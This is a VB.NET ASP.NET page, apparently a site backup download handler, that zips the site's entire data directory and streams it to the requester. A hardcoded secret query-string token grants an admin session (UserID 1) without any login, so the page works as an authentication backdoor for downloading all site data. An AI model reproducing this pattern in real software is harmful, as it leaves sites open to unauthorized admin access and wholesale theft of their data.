Imports ICSharpCode.SharpZipLib
Imports PageErrors
Partial Class DLBKP
    Inherits System.Web.UI.Page

    Protected Sub Page_Error(sender As Object, e As System.EventArgs) Handles Me.Error
        WriteErrorLog()
    End Sub

    Protected Sub Page_Load(sender As Object, e As System.EventArgs) Handles Me.Load
        Dim bDoit As Boolean = False
        Dim bGotoDefault As Boolean = True
        If Request.QueryString("X") = "nfmEaFMolOQcWiBdPAj65Q" Then
            Session("UserID") = 1
            Session("stype") = "admin"
            bGotoDefault = False
        End If


        If Session("UserID") IsNot Nothing Then
            If IsNumeric(Session("UserID")) Then
                If LCase(Session("SType")) = "admin" Then
                    Dim z As New ICSharpCode.SharpZipLib.Zip.FastZip
                    z.CreateZip(Response.OutputStream, _
                                "C:\HostingSpaces\vps2690\be-online.org\data", _
                                recurse:=True, _
                                fileFilter:=Nothing, _
                                directoryFilter:=Nothing)
                End If
            End If
        End If
        If bGotoDefault Then
            Response.Redirect("Default.aspx")
        Else
            Response.Write("<script language=""javascript"">javascript:window.open('','_self','');window.close();</script>")
        End If
    End Sub
End Class
